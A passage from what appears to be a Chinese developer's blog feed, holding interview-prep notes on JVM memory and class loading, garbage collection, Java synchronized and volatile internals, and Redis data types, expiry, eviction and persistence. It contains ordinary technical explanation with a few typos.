title="对象的访问定位"></a>对象的访问定位</h2><p>建立对象就是为了使用对象，我们的Java程序通过栈上的 reference 数据来操作堆上的具体对象。对象的访问方式有虚拟机实现而定，目前主流的访问方式有<strong>①使用句柄</strong>和<strong>②直接指针</strong>两种：</p><ol><li><p><strong>句柄：</strong> 如果使用句柄的话，那么Java堆中将会划分出一块内存来作为句柄池，<strong>reference 中存储的就是对象的句柄地址</strong>，而句柄中包含了对象实例数据与类型数据各自的具体地址信息； </p><p><img src="https://user-gold-cdn.xitu.io/2018/4/27/16306b9573968946?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="使用句柄"></p></li></ol><ol start="2"><li><strong>直接指针：</strong>  如果使用直接指针访问，那么 Java 堆对像的布局中就必须考虑如何防止放置类型数据的相关信息（如对象的类型，实现的接口、方法、父类、field等），<strong>reference 中存储的直接就是对象的地址。</strong></li></ol><p><img src="https://user-gold-cdn.xitu.io/2018/4/27/16306ba3a41b6b65?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="使用直接指针"></p><p>这两种对象访问方式各有优势。使用句柄来访问的最大好处是 reference 中存储的是稳定的句柄地址，在对象被移动后（垃圾收集时移动对象是非常普遍的行为），<strong>只会改变句柄中的实例数据指针，而 reference 本身不需要修改</strong>。使用直接指针访问方式最大的好处就是速度快，<strong>它节省了一次指针定位的时间开销。</strong></p><p><strong>对于HotSpot虚拟机来说，使用的就是直接指针访问的方式。</strong></p><h2 id="介绍下类加载器和类加载过程？"><a href="#介绍下类加载器和类加载过程？" class="headerlink" title="介绍下类加载器和类加载过程？"></a>介绍下类加载器和类加载过程？</h2><p><strong>先说类加载器</strong>。</p><p>在Java中，系统提供了三种类加载器。</p><ul><li>启动类加载器（Bootstrap ClassLoader），启动类加载器无法被Java程序直接引用，用户在编写自定义类加载器时，如果需要委派给启动类加载器，直接使用null。</li><li>扩展类加载器（Extension ClassLoader）</li><li>应用程序类加载器（Application ClassLoader），负责加载用户类路径（ClassPath）上锁指定的类库。是程序中默认的类加载器。</li></ul><p>当然用户也可以自定义类加载器。</p><p><strong>再说类加载的过程</strong>。</p><p>主要是以下几个过程：</p><p><strong>加载 -&gt; 验证 -&gt; 准备 -&gt; 解析 -&gt; 初始化 -&gt; 使用 -&gt; 卸载</strong></p><p><strong>加载</strong></p><ol><li>通过一个类的全限定名获取定义该类的二进制字节流</li><li>将字节流表示的静态存储结构转化为方法区的运行时数据结构</li><li>在内存中生成这个类的Class对象，作为方法区这个类的各种数据的访问入口</li></ol><p><strong>验证</strong></p><ul><li>文件格式验证：比如检查是否以魔数0xCAFEBABE开头</li><li>元数据验证：对类的元数据信息进行语义校验，保证不存在不符合Java语言规范的元数据信息。比如检查该类是否继承了被final修饰的类。</li><li>字节码验证，通过数据流和控制流的分析，验证程序语义是合法的、符合逻辑的。</li></ul><p><strong>准备</strong>。 为类变量（static）分配内存并设置默认值。比如static int a = 123在准备阶段的默认值是0，但是如果有final修饰，在准备阶段就会被赋值为123了。</p><p><strong>解析</strong>。将常量池中的符号引用替换成直接引用的过程。包括类或接口、字段、类方法、接口方法的解析。</p><p><strong>初始化</strong>。按照程序员的计划初始化类变量。如static int a = 123，在准备阶段a的值被设置为默认的0，而到了初始化阶段其值被设置为123。</p><h2 id="什么是双亲委派模型，有什么好处？如何打破双亲委派模型？"><a href="#什么是双亲委派模型，有什么好处？如何打破双亲委派模型？" class="headerlink" title="什么是双亲委派模型，有什么好处？如何打破双亲委派模型？"></a>什么是双亲委派模型，有什么好处？如何打破双亲委派模型？</h2><p>类加载器之间满足双亲委派模型，即：除了顶层的启动类加载器外，其他所有类加载器都必须要自己的父类加载器。当一个类加载器收到类加载请求时，自己首先不会去加载这个类，而是不断把这个请求委派给父类加载器完成，因此所有的加载请求最终都传递给了顶层的启动类加载器。只有当父类无法完成这个加载请求时，子类加载器才会尝试自己去加载。</p><p>双亲委派模型的好处？使得<strong>Java的类随着它的类加载器一起具备了一种带有优先级的层次关系</strong>。Java的Object类是所有类的父类，因此无论哪个类加载器都会加载这个类，因为双亲委派模型，所有的加载请求都委派给了顶层的启动类加载器进行加载。所以Object类在任何类加载器环境中都是同一个类。</p><p>如何打破双亲委派模型？使用OSGi可以打破。<em>OSGI</em>(Open Services Gateway Initiative)，或者通俗点说JAVA动态模块系统。可以实现代码热替换、模块热部署。在OSGi环境下，类加载器不再是双亲委派模型中的树状结构，而是进一步发展为更加复杂的网状结构。</p><h1 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h1><h2 id="新生代和老年代是什么？对象如何进入老年代？"><a href="#新生代和老年代是什么？对象如何进入老年代？" class="headerlink" title="新生代和老年代是什么？对象如何进入老年代？"></a>新生代和老年代是什么？对象如何进入老年代？</h2><p>Java堆分为新生代和老年代。在新生代又被划分为Eden区，From Sruvivor和To Survivor区，比例是8:1:1，所以新生代可用空间其实只有其容量的90%。对象优先被分配在Eden区。</p><ul><li><strong>长期存活的对象会进入老年代。</strong>在Eden区出生的对象经过一次Minor GC会若存活，且Survivor区容纳得下，就会进入Survivor区且对象年龄加1，当对象年龄达到一定的值，就会进入老年代。</li><li><strong>大对象</strong>比如长字符串、数组由于需要大量连续的内存空间，所以直接进入老年代。这是对象进入老年代的一种方式，</li><li>若Survivor区不能容纳存活的对象，则会通过<strong>分配担保机制</strong>转移到老年代。</li><li><strong>同年龄的对象达到suivivor空间的一半</strong>，大于等于该年龄的对象会直接进入老年代。</li></ul><h2 id="新生代的和老年代什么时候会发生GC？"><a href="#新生代的和老年代什么时候会发生GC？" class="headerlink" title="新生代的和老年代什么时候会发生GC？"></a>新生代的和老年代什么时候会发生GC？</h2><p>发生在新生代的GC称为Minor GC，当Eden区被占满了而又需要分配内存时，会发生一次Minor GC，一般使用复制算法，将Eden和From Survivor区中还存活的对象一起复制到To Survivor区中，然后一次性清理掉Eden和From Survivor中的内存，使用复制算法不会产生碎片。</p><p>老年代的GC称为Full GC或者Major GC：</p><ul><li><p>当老年代的内存占满而又需要分配内存时，会发起Full GC</p></li><li><p>调用System.gc()时，可能会发生Full GC，并不保证一定会执行。</p></li><li><p>在Minor GC后survivor区放不下，<strong>通过担保机制进入老年代的对象比老年代的内存空间还大</strong>，会发生Full GC；</p></li><li><p>·在发生Minor GC之前，会先比较历次晋升到老年代的对象平均年龄，如果大于老年代的内存，也会触发Full GC。如果不允许担保失败，直接Full GC。</p></li></ul><h2 id="对象在什么时候可以被回收？调用finalize方法后一定会被回收吗？"><a href="#对象在什么时候可以被回收？调用finalize方法后一定会被回收吗？" class="headerlink" title="对象在什么时候可以被回收？调用finalize方法后一定会被回收吗？"></a>对象在什么时候可以被回收？调用finalize方法后一定会被回收吗？</h2><p>在经过可达性分析后，到GC Roots不可达的对象可以被回收（但并不是一定会被回收，至少要经过两次标记），此时对象被第一次标记，并进行一次判断：</p><p>如果该对象没有调用过或者没有重写finalize()方法，那么在第二次标记后可以被回收了；</p><p>否则，该对象会进入一个FQueue中，稍后由JVM建立的一个Finalizer线程中去执行回收，此时若对象中finalize中“自救”，即和引用链上的任意一个对象建立引用关系，到GC Roots又可达了，在第二次标记时它会被移除“即将回收”的集合；如果finalize中没有逃脱，那就面临被回收。</p><p>因此finalize方法被调用后，对象不一定会被回收。</p><h2 id="GC一定会导致停顿吗，为什么一定要停顿？任意时候都可以GC吗还是在特定的时候？"><a href="#GC一定会导致停顿吗，为什么一定要停顿？任意时候都可以GC吗还是在特定的时候？" class="headerlink" title="GC一定会导致停顿吗，为什么一定要停顿？任意时候都可以GC吗还是在特定的时候？"></a>GC一定会导致停顿吗，为什么一定要停顿？任意时候都可以GC吗还是在特定的时候？</h2><p>GC进行时必须暂停所有Java执行线程，这被称为Stop The World。为什么要停顿呢？因为可达性分析过程中不允许对象的引用关系还在变化，否则可达性分析的准确性就无法得到保证。所以需要STW以保证可达性分析的正确性。</p><p>程序执行时并非在所有地方都能停顿下来开始GC，只有在“安全点”才能暂停。安全点指的是：HotSpot没有为每一条指令都生成OopMap（Ordinary Object Pointer），而是在一些特定的位置记录了这些信息。这些位置就叫安全点。</p><p> 安全点表示所有的工作线程都停了</p><h2 id="哪些对象可以作为GC-Roots？"><a href="#哪些对象可以作为GC-Roots？" class="headerlink" title="哪些对象可以作为GC Roots？"></a>哪些对象可以作为GC Roots？</h2><ul><li><p>虚拟机栈中引用的对象（栈帧中的本地变量表）</p></li><li><p>方法区中类静态属性引用的对象（static）</p></li><li><p>方法区中常量引用的对象（final）</p></li><li><p>本地方法栈中引用的对象</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 秋招 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>synchronized与volatile原理解析</title>
      <link href="/2019/10/01/synchronized%E4%B8%8Evolatile/"/>
      <url>/2019/10/01/synchronized%E4%B8%8Evolatile/</url>
      
        <content type="html"><![CDATA[<h1 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h1><p>在学synchronized和volatile之前，我们先来了解一个概念——什么是线程安全？<br>线程安全简单来说就在多线程的情况下也不会有问题，看似一句废话，要怎么理解呢<br>比如ArrayList不是线程安全的就是一个线程不安全的类，<br>如果两个线程对可以同一个ArrayList进行add操作会出现什么结果？请看下面代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class MyTest &#123;</span><br><span class="line">            static List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            static class BB implements Runnable &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public void run() &#123;</span><br><span class="line">                    for (int j = 0; j &lt; 10000; j++) &#123;</span><br><span class="line">                        list.add(j);</span><br><span class="line">                    &#125; &#125; &#125;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) throws InterruptedException&#123;</span><br><span class="line"></span><br><span class="line">                BB b = new BB();</span><br><span class="line">                Thread t1 = new Thread(b);</span><br><span class="line">                Thread t2 = new Thread(b);</span><br><span class="line">                t1.start();</span><br><span class="line">                t2.start();</span><br><span class="line">                t1.join();</span><br><span class="line">                t2.join();</span><br><span class="line"></span><br><span class="line">                System.out.println(list.size());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>问题出在add方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public boolean add(E e) &#123;   ensureCapacityInternal(size + 1);   </span><br><span class="line">elementData[size++] = e;  </span><br><span class="line">return true;&#125;</span><br></pre></td></tr></table></figure><p>上面的程序，可能有三种情况发生：</p><ul><li>数组下标越界。首先要检查容量，必要时进行扩容。每当在数组边界处，如果A线程和B线程同时进入并检查容量，也就是它们都执行完ensureCapacityInternal方法，因为还有一个空间，所以不进行扩容，此时如果A暂停下来，B成功自增；然后接着A从 elementData[size++]=e开始执行，由于A之前已经检查过没有扩容，而B成功自增使得现在没有空余空间了，此时A就会发生数组下标越界。</li><li>小于20000。size++可以看成是 size=size+1，这一行代码包括三个步骤，先读取size，然后将size加1，最后将这个新值写回到size。此时若A和B线程同时读取到size假设为10，B先自增成功size变11，然后回来A因为它读到的size也是10，所以自增后写入size被更新成11，也就是说两次自增，实际上size只增大了1。因此最后的size会小于200。</li><li>等于20000 很幸运，没有发生上面情况<br>顺便说一句，线程越多，或者加的数越大越可能出现不安全的问题</li></ul><h1 id="synchronized：“这条桥上一次只能过一个人”"><a href="#synchronized：“这条桥上一次只能过一个人”" class="headerlink" title="synchronized：“这条桥上一次只能过一个人”"></a>synchronized：“这条桥上一次只能过一个人”</h1><h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><p>互斥、JVM内置锁、对象锁、可重入(避免死锁)</p><h2 id="有什么用"><a href="#有什么用" class="headerlink" title="有什么用"></a>有什么用</h2><ul><li><strong>原子性</strong>：确保线程互斥的访问同步代码；</li><li><strong>可见性</strong>：保证共享变量的修改能够及时可见，其实是通过Java内存模型中的 <strong>“对一个变量unlock操作之前，必须要同步到主内存中；如果对一个变量进行lock操作，则将会清空工作内存中此变量的值，在执行引擎使用此变量前，需要重新从主内存中load操作或assign操作初始化变量值”</strong> 来保证的；</li><li><strong>有序性</strong>：有效解决重排序问题，即 <strong>“一个unlock操作先行发生(happen-before)于后面对同一个锁的lock操作”</strong>；</li></ul><h2 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h2><p>当synchronized作用在实例方法时，监视器锁（monitor）便是<strong>对象实例（this）</strong>；</p><p>当synchronized作用在静态方法时，监视器锁（monitor）便是对象的<strong>Class实例</strong>，因为Class数据存在于永久代，因此静态方法锁相当于该类的一个<strong>全局锁</strong>；</p><p>当synchronized作用在某一个对象实例时，监视器锁（monitor）便是<strong>括号括起来的对象实例</strong>；</p><h2 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h2><p>想了解synchronized的原理，首先要了解两个东西：对象头中的Mark Word和Monitor，说白了，前者是资源的锁，后者是拥有者线程的锁记录。加锁要修改拥有者和资源的锁记录才行。</p><p>加锁的时候<strong>首先要添加拥有者线程的锁记录</strong>，虚拟机会在当前线程的栈帧中建立一个名为锁记录( Lock Record)的空间,用于存储锁对象目前的Mark Word的拷贝</p><p><strong>然后要修改资源的锁记录</strong>,虚拟机将使用<strong>CAS</strong>操作尝试将对象的 Mark Word更新为指向 Lock record的指针。如果这个更新动作成功了,那么这个线程就拥有了该对象的锁,并且对象 Mark Word的锁标志位将转变为“00”,即表示此对象处于轻量级锁定状态。</p><h3 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h3><p>Monitor是<strong>线程私有</strong>的数据结构，每一个线程都有一个可用monitor record列表，它依赖于底层的操作系统的<strong>Mutex Lock（互斥锁）</strong>来实现的线程同步。这种方式就是synchronized最初实现同步的方式，这就是JDK 6之前synchronized效率低的原因。这种依赖于操作系统Mutex Lock所实现的锁我们称之为“重量级锁”，JDK 6中为了减少获得锁和释放锁带来的性能消耗，引入了“偏向锁”和“轻量级锁”。</p><h3 id="对象头中的Mark-Word"><a href="#对象头中的Mark-Word" class="headerlink" title="对象头中的Mark Word"></a>对象头中的Mark Word<img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A6%82%E5%BF%B5.png" alt="多线程概念"></h3><p><strong>对象头</strong>：Mark Word（标记字段）、Klass Pointer（类型指针）、数组长度数据（可选）</p><p><strong>实例数据</strong>：存放<strong>类的属性</strong>数据信息，包括父类的属性信息；</p><p><strong>对齐填充</strong>：由于虚拟机要求 对象起始地址必须是8字节的整数倍。填充数据<strong>不是必须的</strong>，仅仅是为了字节对齐；</p><p><strong>Mark Word中四种锁状态标识</strong></p><table><thead><tr><th style="text-align:left">锁状态</th><th style="text-align:left">存储内容</th><th style="text-align:left">存储内容</th></tr></thead><tbody><tr><td style="text-align:left">无锁</td><td style="text-align:left">对象的hashCode、对象分代年龄、是否是偏向锁（0）</td><td style="text-align:left">01</td></tr><tr><td style="text-align:left">偏向锁</td><td style="text-align:left">偏向线程ID、偏向时间戳、对象分代年龄、是否是偏向锁（1）</td><td style="text-align:left">01</td></tr><tr><td style="text-align:left">轻量级锁</td><td style="text-align:left">指向栈中锁记录的指针</td><td style="text-align:left">00</td></tr><tr><td style="text-align:left">重量级锁</td><td style="text-align:left">指向互斥量（重量级锁）的指针</td><td style="text-align:left">10</td></tr></tbody></table><p><em>注意：无锁和偏向锁使用的是一个标志位，但偏向锁还有是否是偏向锁标志位、线程ID、Epoch等</em></p><p>接下来我将顺着标识位来讲synchronized的四种锁状态。</p><h3 id="四种锁状态"><a href="#四种锁状态" class="headerlink" title="四种锁状态"></a>四种锁状态</h3><p>JDK 6之前synchronized效率低，是因为依赖于操作系统Mutex Lock，即“重量级锁”，阻塞或唤醒一个Java线程需要操作系统切换CPU状态来完成，这种状态转换需要耗费处理器时间。JDK 6中为了减少获得锁和释放锁带来的性能消耗，引入了“偏向锁”和“轻量级锁”。</p><p>JDK 6之后的synchronized锁级别从低到高依次是：<strong>无锁、偏向锁、轻量级锁和重量级锁。锁状态只能升级不能降级。</strong></p><table><thead><tr><th><strong>锁</strong></th><th>消耗</th><th><strong>缺点</strong></th><th><strong>适用场景</strong></th></tr></thead><tbody><tr><td>偏向锁</td><td>加锁和解锁时对比Mark Word，只需一次CAS原子指令</td><td>如果线程间存在锁竞争，会带来额外的锁撤销的消耗</td><td>适用于只有一个线程访问同步块场景</td></tr><tr><td>轻量级锁</td><td>将Mark word拷贝到栈帧的锁记录中，再将Mark Word替换为锁记录的指针。多个CAS操作和自旋。</td><td>自旋会消耗<strong>CPU</strong>，但相应时间快</td><td>追求响应速度，同步块执行速度非常快</td></tr><tr><td>重量级锁</td><td>依赖于操作系统Mutex Lock，等待线程被阻塞挂起</td><td>线程阻塞<strong>响应时间缓慢</strong>，但不会消耗CPU</td><td>追求吞吐量，同步块执行速度较长</td></tr></tbody></table><h4 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a><strong>偏向锁</strong></h4><p>HotSpot发现：在大多数情况下，锁总是由同一线程多次获得，不存在多线程竞争，所以出现了偏向锁。其目标就是在只有一个线程执行同步代码块时能够提高性能。</p><p>当一个线程访问同步代码块并获取锁时，会在Mark Word里存储<strong>锁偏向的线程ID</strong>。在线程进入和退出同步块时不再通过CAS操作来加锁和解锁，而是检测Mark Word里是否存储着指向当前线程的偏向锁。引入偏向锁是为了在<strong>无多线程竞争的情况下尽量减少不必要的轻量级锁执行路径</strong>，因为轻量级锁的获取及释放依赖<strong>多次</strong>CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖<strong>一次</strong>CAS原子指令即可。</p><p>偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁。偏向锁的撤销，需要等待<strong>全局安全点</strong>（在这个时间点上没有字节码正在执行），它会首先暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态。撤销偏向锁后恢复到无锁（标志位为“01”）或轻量级锁（标志位为“00”）的状态。</p><p>偏向锁在JDK 6及以后的JVM里是默认启用的。可以通过JVM参数关闭偏向锁：-XX:-UseBiasedLocking=false，关闭之后程序默认会进入轻量级锁状态。</p><h4 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a><strong>轻量级锁</strong></h4><p>是指当锁是偏向锁的时候，被另外的线程所访问，偏向锁就会升级为轻量级锁，<strong>其他线程会通过自旋</strong>的形式尝试获取锁，不会阻塞，从而提高性能。</p><p>虚拟机会在当前线程的栈帧中建立一个名为锁记录( Lock Record)的空间,用于存储锁对象目前的Mark Word的拷贝。<br>然后虚拟机将使用<strong>CAS</strong>操作尝试将对象的 Mark Word更新为指向 Lock record的指针。如果这个更新动作成功了,那么这个线程就拥有了该对象的锁,并且对象 Mark Word的锁标志位将转变为“00”,即表示此对象处于轻量级锁定状态。即上面说的加锁要修改拥有者和资源的锁记录才行。</p><p>如果轻量级锁的更新操作失败了，虚拟机首先会检查对象的Mark Word是否指向当前线程的栈帧，如果是就说明当前线程已经拥有了这个对象的锁，那就可以直接进入同步块继续执行，否则说明多个线程竞争锁。</p><p>若当前只有一个等待线程，则该线程通过自旋进行等待。但是当自旋超过一定的次数，或者一个线程在持有锁，一个在自旋，又有<strong>第三个</strong>来访时，轻量级锁升级为重量级锁。</p><h4 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a><strong>重量级锁</strong></h4><p>升级为重量级锁时，锁标志的状态值变为“10”，此时Mark Word中存储的是指向重量级锁的指针，此时<strong>等待锁的线程都会进入阻塞状态。</strong></p><h1 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h1><h2 id="有什么用-1"><a href="#有什么用-1" class="headerlink" title="有什么用"></a>有什么用</h2><p>volatile是一个关键字，用于修饰变量。被其修饰的变量具有可见性和有序性。</p><ul><li><strong>可见性</strong>，当一条线程修改了这个变量的值，新值能被其他线程立刻观察到。其实这里要结合Java内存结构来说：在缓存在本CPU对变量的修改直接写入主内存中，同时这个写操作使得其他CPU中对应变量的缓存行无效，这样其他线程在读取这个变量时候必须从主内存中读取，所以读取到的是最新的，这就是上面说得能被立即“看到”。</li><li><strong>有序性</strong>，即volatile可以<strong>禁止指令重排</strong>。volatile在其汇编代码中有一个lock操作，这个操作相当于一个<strong>内存屏障</strong>，指令重排不能越过内存屏障。具体来说在执行到volatile变量时，内存屏障之前的语句一定被执行过了且结果对后面是已知的，而内存屏障后面的语句一定还没执行到；在volatile变量之前的语句不能被重排后其之后，相反其后的语句也不能被重排到之前。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>加入volatile关键字时，会多出一个<strong>lock前缀指令</strong>。lock前缀指令其实就相当于一个内存屏障。<strong>内存屏障是一组处理指令，用来实现对内存操作的顺序限制。</strong>volatile的底层就是通过内存屏障来实现的。</p><p>lock前缀会做两件事情：</p><ul><li><strong>将当前处理器缓存行的数据会写回到系统内存。</strong>这可以保证写操作强制被更新到处理器，处理器的值是最新的。</li><li>这个写回内存的操作会引起在其他CPU里缓存了该内存地址的数据无效。<strong>这可以保证每个线程总是去处理器读，而不是使用自己可能过期的缓存数据。</strong>以实现缓存一致性协议，每个处理器通过嗅探在总线上传播的数据来检查自己缓存的值是不是过期了，当处理器发现自己缓存行对应的内存地址被修改，就会将当前处理器的缓存行设置成无效状态，当处理器要对这个数据进行修改操作的时候，会强制重新从系统内存里把数据读到处理器缓存里。</li></ul><p>也就符合了happens-before原则中——同一时间对volatile变量的写操作总先于读操作，实现了程序的有序性。（如果两个操作的执行顺序无法从happens-before原则中推到出来，那么他们就不能保证有序性，可以随意进行重排序。）</p><h2 id="经典场景"><a href="#经典场景" class="headerlink" title="经典场景"></a>经典场景</h2><p>chm的get方法是<strong>不加锁的</strong>，因为get方法里的共享变量都定义成volatile类型，保证能被多线程的读，但只能被单线程的写。即使一个线程在读一个线程同时在写，根据happen before原则，对volatile字段的写入先于读操作，所以get总能拿到最新的值。这是用volatile替换锁的经典场景。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h3 id="为什么wait-notify在Object类里，而把sleep放在Thread类里面？"><a href="#为什么wait-notify在Object类里，而把sleep放在Thread类里面？" class="headerlink" title="为什么wait,notify在Object类里，而把sleep放在Thread类里面？"></a>为什么wait,notify在Object类里，而把sleep放在Thread类里面？</h3><p>sleep和wait的区别在于：sleep方法没有释放锁，而wait方法释放了锁。</p><p>一个线程可以拥有多个对象锁，wait，notify，notifyAll跟对象锁之间是有一个绑定关系的，假如用Thread.wait()，Thread.notify()，Thread.notifyAll()来调用，虚拟机根本就不知道需要操作的对象锁是哪一个。</p><p>a</p>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redis详解</title>
      <link href="/2019/09/01/redis/"/>
      <url>/2019/09/01/redis/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>redis 主要有以下几种数据类型：</p><table><thead><tr><th></th><th>String字符串</th><th>Hash</th><th>list</th><th>set</th><th>sort set</th></tr></thead><tbody><tr><td>存储方式</td><td>K,V</td><td>结构存储</td><td>有序</td><td>无序和去重】、</td><td>排序列表</td></tr><tr><td>应用</td><td>万物皆可字符串</td><td>存对象（但不可有对象的引用）</td><td>粉丝、关注、评论</td><td>点赞人，全局过滤去重</td><td>排行榜</td></tr><tr><td>技巧</td><td></td><td>可对象的操作字段</td><td>lrange分页，bpop阻塞队列</td><td>交集并集差集、</td></tr></tbody></table><h2 id="为啥-redis-效率这么高？"><a href="#为啥-redis-效率这么高？" class="headerlink" title="为啥 redis 效率这么高？"></a>为啥 redis 效率这么高？</h2><ul><li>纯内存操作。</li><li>核心是基于非阻塞的 IO 多路复用机制。</li><li>C 语言实现，一般来说，C 语言实现的程序“距离”操作系统更近，执行速度相对会更快。</li><li>单线程反而避免了多线程的频繁上下文切换问题，预防了多线程可能产生的竞争问题。</li></ul><h2 id="过期策略"><a href="#过期策略" class="headerlink" title="过期策略"></a>过期策略</h2><ul><li>往 redis 写入的数据怎么没了？</li></ul><p>内存是有限的，比如 redis 就只能用 10G，你要是往里面写了 20G 的数据，会干掉 10G 的数据，然后就保留 10G 的数据了。</p><ul><li>数据明明过期了，怎么还占用着内存？</li></ul><p>这是由 redis 的过期策略来决定。</p><h3 id="redis-过期策略"><a href="#redis-过期策略" class="headerlink" title="redis 过期策略"></a>redis 过期策略</h3><p>redis 过期策略是：<strong>定期删除+惰性删除</strong>。</p><p>所谓<strong>定期删除</strong>，指的是 redis 默认是每隔 100ms 就随机抽取一些设置了过期时间的 key，检查其是否过期，如果过期就删除。</p><p><strong>惰性删除</strong>:获取 key 的时候，如果此时 key 已经过期，就删除，不会返回任何东西。</p><p>如果定期删除漏掉了很多过期 key，然后你也没及时去查，也就没走惰性删除，大量过期 key 堆积在内存里，导致 redis 内存块耗尽了，咋整？答案是：<strong>走内存淘汰机制</strong>。</p><h3 id="内存淘汰机制"><a href="#内存淘汰机制" class="headerlink" title="内存淘汰机制"></a>内存淘汰机制</h3><p>redis 内存淘汰机制有以下几个：</p><ul><li>noeviction: 当内存不足以容纳新写入数据时，新写入操作会报错，这个一般没人用吧，实在是太恶心了。</li><li><strong>allkeys-lru</strong>：当内存不足以容纳新写入数据时，在<strong>键空间</strong>中，移除最近最少使用的 key（这个是<strong>最常用</strong>的）。</li><li>allkeys-random：当内存不足以容纳新写入数据时，在<strong>键空间</strong>中，随机移除某个 key，这个一般没人用吧，为啥要随机，肯定是把最近最少使用的 key 给干掉啊。</li><li>volatile-lru：当内存不足以容纳新写入数据时，在<strong>设置了过期时间的键空间</strong>中，移除最近最少使用的 key（这个一般不太合适）。</li><li>volatile-random：当内存不足以容纳新写入数据时，在<strong>设置了过期时间的键空间</strong>中，<strong>随机移除</strong>某个 key。</li><li>volatile-ttl：当内存不足以容纳新写入数据时，在<strong>设置了过期时间的键空间</strong>中，有<strong>更早过期时间</strong>的 key 优先移除。</li></ul><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><ul><li>RDB：RDB 持久化机制，是对 redis 中的数据执行<strong>周期性</strong>的持久化。</li><li>AOF：AOF 机制对每条写入命令作为日志，以 <code>append-only</code> 的模式写入一个日志文件中，在 redis 重启的时候，可以通过<strong>回放</strong> AOF 日志中的写入指令来重新构建整个数据集。</li></ul><table><thead><tr><th></th><th>如何持久化</th><th>丢失数据</th><th>写入性能</th><th>文件大小</th><th>恢复速度</th><th>场景</th></tr></thead><tbody><tr><td>RDB</td><td>数据周期存储</td><td>容易丢失</td><td>低</td><td>小</td><td>快</td><td>冷备</td></tr><tr><td>AOF</td><td>指令重新构建</td><td>不容易（只丢失最近一秒）</td><td>高，没有磁盘寻址的开销</td><td>大，文件是逐渐大的</td><td>慢</td><td>误删的紧急恢复</td></tr></tbody></table><h3 id="RDB-快照（保存值）"><a href="#RDB-快照（保存值）" class="headerlink" title="RDB 快照（保存值）"></a>RDB 快照（保存值）</h3><p>触发机制</p><p>1.全量复制：主从复制的时候，主会自动生成RDB文件<br>2.debug reload：不需要将内存清空的重启也会触发RDB的生成<br>3.shutdown，关闭的时候会自动生成shutdown save</p><p>三种命令</p><p>save（同步）数据进行完整的拷贝的话可能会阻塞注命令<br>bgsave(异步)生成子进程去完成RDB的生成<br>自动：满足900秒有1个改变、300秒有10个，60秒有1000个改变一条件就进行save</p><p>场景：冷备</p><h3 id="AOF-日志（保存命令）"><a href="#AOF-日志（保存命令）" class="headerlink" title="AOF 日志（保存命令）"></a>AOF 日志（保存命令）</h3><p>这个文件是逐渐增大的。</p><p>三种策略：always everysec no（os决定）</p><p> AOF重写：把一些过期的命令进行优化。</p><p>场景：误删的紧急处理。比如某人不小心用 <code>flushall</code> 命令清空了所有数据，只要这个时候后台 <code>rewrite</code> 还没有发生，那么就可以立即拷贝 AOF 文件，将最后一条 <code>flushall</code> 命令给删了，然后再将该 <code>AOF</code> 文件放回去，就可以通过恢复机制，自动恢复所有数据。</p><h3 id="RDB-和-AOF-到底该如何选择"><a href="#RDB-和-AOF-到底该如何选择" class="headerlink" title="RDB 和 AOF 到底该如何选择"></a>RDB 和 AOF 到底该如何选择</h3><ul><li><p>仅仅使用 RDB，因为那样会导致你丢失很多数据；</p></li><li><p>仅仅使用 AOF有两个问题：第一， AOF 没有 RDB 做冷备来的<strong>恢复速度</strong>更快；第二，RDB 每次简单粗暴生成数据快照，<strong>更加健壮</strong>，可以避免 AOF 这种复杂的备份和恢复机制的 bug；</p></li><li><p>redis 支持同时开启开启两种持久化方式，我用 AOF 来保证数据不丢失，作为数据恢复的第一选择; 用 RDB 来做不同程度的冷备，在 AOF 文件都丢失或损坏不可用的时候，还可以使用 RDB 来进行快速的数据恢复。另外，如果同时使用 RDB 和 AOF 两种持久化机制，<strong>redis</strong> 重启的时候，会使用 <strong>AOF</strong> 来重新构建数据，因为 AOF 